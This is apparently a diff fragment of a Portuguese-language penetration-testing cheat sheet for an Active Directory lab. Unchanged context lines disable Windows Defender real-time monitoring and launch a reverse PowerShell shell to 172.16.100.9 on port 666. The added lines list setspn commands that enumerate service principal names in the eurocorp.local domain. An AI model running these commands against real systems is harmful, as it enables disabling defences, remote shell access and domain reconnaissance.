@@ -3026,6 +3026,12 @@ NA ULTIMA LINHA DO ARQUIVO Invoke-PowerShellTcp2.ps1, COLOCAR:
 Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
 Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.9  -Port 666
 ```
+##### CMD - LISTAR SPN
+```
+setspn -L eurocorp-dc.eurocorp.local
+setspn -T medin -Q */*
+setspn -L eurocorp.local\eurocorp-dc
+```
 
 
 
